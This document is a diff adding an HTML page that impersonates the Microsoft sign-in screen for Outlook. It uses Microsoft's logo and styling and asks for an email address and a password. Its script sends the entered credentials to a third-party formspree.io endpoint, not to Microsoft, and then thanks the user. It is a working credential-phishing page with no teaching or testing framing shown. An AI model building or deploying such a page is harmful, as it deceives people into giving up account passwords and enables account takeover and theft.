@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Microsoft Sign In - Secure Login</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f3f3f3;
+    color: #333;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+  }
+  .container {
+    background: white;
+    max-width: 400px;
+    width: 100%;
+    border-radius: 10px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+    padding: 32px 32px 32px;
+    text-align: center;
+  }
+  header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+  header img {
+    width: 48px;
+    height: 48px;
+    user-select: none;
+  }
+  header .microsoft-text {
+    font-weight: 700;
+    font-size: 2rem;
+    color: #0078d7;
+    user-select: none;
+  }
+  h1.signin-heading {
+    font-weight: 700;
+    margin: 24px 0 4px 0;
+    color: #333;
+    font-size: 1.6rem;
+    user-select: none;
+  }
+  .subheading {
+    font-weight: 400;
+    color: #555;
+    margin-bottom: 24px;
+    font-size: 1rem;
+    user-select: none;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+    align-items: stretch;
+    text-align: left;
+  }
+  label {
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: #333;
+    user-select: none;
+  }
+  input[type="email"],
+  input[type="password"],
+  input[type="text"] {
+    padding: 14px 12px;
+    font-size: 1rem;
+    border: 1.8px solid #0078d7;
+    border-radius: 6px;
+    margin-bottom: 16px;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    outline-offset: 0;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    width: 100%;
+  }
+  input[type="email"]:focus,
+  input[type="password"]:focus,
+  input[type="text"]:focus {
+    border-color: #005a9e;
+    box-shadow: 0 0 6px 1px rgba(0, 120, 215, 0.4);
+    outline: none;
+  }
+  input.invalid {
+    border-color: #d93025;
+  }
+  .error-message {
+    color: #d93025;
+    font-size: 0.85rem;
+    margin-top: -12px;
+    margin-bottom: 14px;
+    display: none;
+    user-select: none;
+  }
+  button[type="submit"] {
+    padding: 14px 0;
+    font-size: 1.1rem;
+    font-weight: 700;
+    background-color: #0078d7;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.3s ease;
+    width: 100%;
+  }
+  button[type="submit"]:hover,
+  button[type="submit"]:focus {
+    background-color: #005a9e;
+    outline: none;
+  }
+  .message {
+    margin-top: 20px;
+    font-weight: 600;
+    font-size: 1rem;
+    text-align: center;
+    user-select: none;
+  }
+  .message.success {
+    color: #0078d7;
+  }
+  .message.error {
+    color: #d93025;
+  }
+  /* Honeypot hidden */
+  .honeypot {
+    position: absolute !important;
+    left: -10000px !important;
+    top: auto !important;
+    width: 1px !important;
+    height: 1px !important;
+    overflow: hidden !important;
+  }
+  @media (max-width: 480px) {
+    .container {
+      padding: 28px 24px 24px;
+    }
+    header .microsoft-text {
+      font-size: 1.6rem;
+    }
+    h1.signin-heading {
+      font-size: 1.3rem;
+      margin: 20px 0 12px 0;
+    }
+    button[type="submit"] {
+      font-size: 1rem;
+      padding: 12px 0;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="container" role="main" aria-label="Microsoft sign in form">
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/256px-Microsoft_logo.svg.png" alt="Microsoft logo" />
+    <div class="microsoft-text">Microsoft</div>
+  </header>
+  <h1 class="signin-heading">Sign In</h1>
+  <div class="subheading">to continue to Outlook</div>
+  <form id="signInForm" action="https://formspree.io/f/xovdkvnz" method="POST" novalidate autocomplete="off" aria-label="Sign in form with spam protection">
+    <!-- Honeypot hidden field -->
+    <label class="honeypot" for="website">Website (leave blank)</label>
+    <input class="honeypot" type="text" id="website" name="website" tabindex="-1" autocomplete="off" />
+
+    <label for="email">Email address</label>
+    <input type="email" id="email" name="email" required aria-required="true" placeholder="email@example.com" />
+    <div id="emailError" class="error-message" aria-live="polite">Please enter a valid email address.</div>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" minlength="6" required aria-required="true" placeholder="Enter your password" />
+    <div id="passwordError" class="error-message" aria-live="polite">Password must be at least 6 characters long.</div>
+
+    <button type="submit" aria-label="Sign in">Sign In</button>
+
+    <div id="formMessage" class="message" role="alert" aria-live="polite"></div>
+  </form>
+</div>
+
+<script>
+  (function(){
+    const form = document.getElementById('signInForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const websiteInput = document.getElementById('website'); // honeypot
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const formMessage = document.getElementById('formMessage');
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    function clearErrors() {
+      emailError.style.display = 'none';
+      passwordError.style.display = 'none';
+      formMessage.textContent = '';
+      formMessage.className = 'message';
+      emailInput.classList.remove('invalid');
+      passwordInput.classList.remove('invalid');
+    }
+
+    form.addEventListener('submit', function(e){
+      e.preventDefault();
+      clearErrors();
+
+      let valid = true;
+
+      if(websiteInput.value.trim() !== ''){
+        formMessage.textContent = 'Spam submission detected.';
+        formMessage.classList.add('error');
+        return;
+      }
+
+      if(!validateEmail(emailInput.value.trim())){
+        emailError.style.display = 'block';
+        emailInput.classList.add('invalid');
+        valid = false;
+      }
+
+      if(passwordInput.value.trim().length < 6){
+        passwordError.style.display = 'block';
+        passwordInput.classList.add('invalid');
+        valid = false;
+      }
+
+      if (!valid) return;
+
+      const formData = new FormData(form);
+      formMessage.textContent = 'Sending...';
+      formMessage.className = 'message';
+      
+      fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: { 'Accept': 'application/json' },
+      })
+      .then(response => {
+        if (response.ok) {
+          formMessage.textContent = 'Thank you! Your details have been sent.';
+          formMessage.className = 'message success';
+          form.reset();
+        } else {
+          return response.json().then(data => {
+            if(data && data.errors){
+              formMessage.textContent = data.errors.map(e => e.message).join(', ');
+            } else {
+              formMessage.textContent = 'Oops! Something went wrong. Please try again.';
+            }
+            formMessage.className = 'message error';
+          });
+        }
+      })
+      .catch(() => {
+        formMessage.textContent = 'Oops! Network error. Please try again.';
+        formMessage.className = 'message error';
+      });
+    });
+  })();
+</script>
+</body>
+</html>
+
